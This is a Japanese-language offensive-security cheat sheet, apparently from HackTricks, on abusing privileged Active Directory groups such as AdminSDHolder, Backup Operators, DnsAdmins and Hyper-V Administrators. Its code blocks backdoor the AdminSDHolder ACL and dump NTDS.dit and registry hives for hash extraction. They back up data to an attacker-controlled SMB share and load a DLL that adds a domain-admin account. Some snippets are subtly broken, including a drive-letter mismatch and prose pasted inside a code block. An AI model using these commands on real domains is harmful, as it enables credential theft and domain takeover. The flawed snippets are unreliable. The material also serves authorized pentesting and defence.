# 特権グループ

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦で私をフォローする：[**@carlospolopm**](https://twitter.com/carlospolopm)。
- **ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## 管理特権を持つよく知られたグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## アカウントオペレーター

このグループは、ドメイン上の管理者でないアカウントやグループを作成する権限を持っています。さらに、ドメインコントローラ（DC）へのローカルログインを有効にします。

このグループのメンバーを特定するために、次のコマンドが実行されます：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DC01へのローカルログインも可能です。

## AdminSDHolderグループ

**AdminSDHolder**グループのアクセス制御リスト（ACL）は、Active Directory内のすべての「保護されたグループ」、高特権グループを含む、権限を設定するために重要です。このメカニズムにより、これらのグループのセキュリティが確保され、未承認の変更が防止されます。

攻撃者は、**AdminSDHolder**グループのACLを変更して、権限を完全に与えることで、標準ユーザーに対して攻撃を行う可能性があります。これにより、そのユーザーにはすべての保護されたグループに対する完全な制御権限が与えられます。このユーザーの権限が変更または削除された場合、システムの設計により、1時間以内に自動的に再設定されます。

メンバーを確認し、権限を変更するためのコマンドは次のとおりです：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
スクリプトを使用して復元プロセスを迅速化できます：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)を参照してください。

## AD Recycle Bin

このグループへのメンバーシップにより、削除されたActive Directoryオブジェクトの読み取りが可能となり、機密情報が明らかになる可能性があります：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ドメインコントローラーアクセス

DC上のファイルへのアクセスは、ユーザーが `Server Operators` グループの一部でない限り制限されており、これによりアクセスレベルが変更されます。

### 特権昇格

Sysinternalsの `PsService` または `sc` を使用すると、サービスの権限を調査および変更できます。たとえば、`Server Operators` グループは特定のサービスに対して完全な制御権を持っており、任意のコマンドの実行と特権昇格が可能です。
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドは、`Server Operators` が完全なアクセス権を持ち、昇格された特権のためにサービスの操作が可能であることを明らかにします。

## バックアップオペレーター

`Backup Operators` グループへのメンバーシップは、`SeBackup` および `SeRestore` 特権により、`DC01` ファイルシステムへのアクセス権を提供します。これらの特権により、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、明示的なアクセス許可なしにフォルダのトラバーサル、リスト、およびファイルのコピーが可能となります。このプロセスには特定のスクリプトの利用が必要です。

グループのメンバーをリストするには、次のコマンドを実行します:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの特権をローカルで活用するために、次の手順が使用されます：

1. 必要なライブラリをインポートします：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` の有効化と検証:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする場合、たとえば:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻撃

ドメインコントローラのファイルシステムへの直接アクセスにより、すべてのドメインユーザーおよびコンピューターのNTLMハッシュを含む`NTDS.dit`データベースを盗むことができます。

#### diskshadow.exeの使用

1. `C`ドライブのシャドウコピーを作成します：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
代わりに、ファイルのコピーに `robocopy` を使用します：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュの取得のために `SYSTEM` と `SAM` を抽出します:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`からすべてのハッシュを取得します：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exeの使用

1. 攻撃者のマシンにSMBサーバー用のNTFSファイルシステムを設定し、ターゲットマシンでSMB資格情報をキャッシュします。
2. システムバックアップと`NTDS.dit`の抽出に`wbadmin.exe`を使用します：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実演は、[IPPSECによるデモビデオ](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)を参照してください。

## DnsAdmins

**DnsAdmins**グループのメンバーは、DNSサーバー（通常はドメインコントローラーにホストされる）で任意のDLLをSYSTEM権限で読み込む特権を悪用できます。この機能により、重要な悪用の可能性が生じます。

DnsAdminsグループのメンバーをリストするには、次を使用します：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意のDLLの実行

メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）を読み込ませることができます：
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNSサービスを再起動する（追加の権限が必要かもしれません）必要があります。DLLが読み込まれるために。
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
#### Mimilib.dll
mimilib.dllを使用して、特定のコマンドやリバースシェルを実行するように変更することが可能です。詳細については、[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を参照してください。

### WPAD Record for MitM
DnsAdminsは、グローバルクエリブロックリストを無効にした後、WPADレコードを作成することで、Man-in-the-Middle（MitM）攻撃を実行するためにDNSレコードを操作できます。 ResponderやInveighなどのツールを使用して、スプーフィングやネットワークトラフィックのキャプチャが可能です。

### Event Log Readers
メンバーはイベントログにアクセスでき、平文のパスワードやコマンド実行の詳細など、機密情報を見つける可能性があります。
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
このグループは、ドメインオブジェクトのDACLを変更でき、DCSync権限を付与する可能性があります。このグループを悪用した特権昇格のテクニックについては、Exchange-AD-Privesc GitHubリポジトリで詳細に説明されています。
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V管理者
Hyper-V管理者は、Hyper-Vへの完全なアクセス権を持ち、仮想化されたドメインコントローラーを制御するために悪用される可能性があります。これには、ライブDCのクローン作成やNTDS.ditファイルからNTLMハッシュを抽出することが含まれます。

### 悪用例
FirefoxのMozilla Maintenance Serviceは、Hyper-V管理者によってSYSTEMとしてコマンドを実行するために悪用される可能性があります。これには、保護されたSYSTEMファイルへのハードリンクの作成と、それを悪意のある実行可能ファイルで置き換える作業が含まれます。
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## 組織管理

**Microsoft Exchange** が展開されている環境では、**Organization Management** として知られる特別なグループが重要な機能を持っています。このグループは、**すべてのドメインユーザーのメールボックスにアクセス**し、**'Microsoft Exchange Security Groups'** 組織単位（OU）全体を**完全に制御**します。この制御には、特権昇格に悪用される可能性のある **`Exchange Windows Permissions`** グループも含まれます。

### 特権悪用とコマンド

#### プリント オペレータ
**プリント オペレータ** グループのメンバーは、**`SeLoadDriverPrivilege`** を含む複数の特権を持っており、これにより**ドメインコントローラにローカルログオン**したり、シャットダウンしたり、プリンタを管理したりできます。これらの特権を悪用するには、特に**`SeLoadDriverPrivilege`** が昇格されていない状況で見えない場合、ユーザーアカウント制御（UAC）をバイパスする必要があります。

このグループのメンバーをリストするために、次のPowerShellコマンドが使用されます：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
#### リモート デスクトップ ユーザー
このグループのメンバーは、リモート デスクトップ プロトコル（RDP）を介してPCにアクセスできます。これらのメンバーを列挙するには、PowerShellコマンドが使用できます：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
さらなるRDPの悪用に関する洞察は、専用のペンテストリソースで見つけることができます。

#### リモート管理ユーザー
メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、次のように行われます：
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
#### サーバーオペレーター
このグループには、バックアップと復元権限、システム時刻の変更、システムのシャットダウンなど、ドメインコントローラーでさまざまな構成を実行する権限があります。メンバーを列挙するために提供されるコマンドは次のとおりです：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考文献 <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする
* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
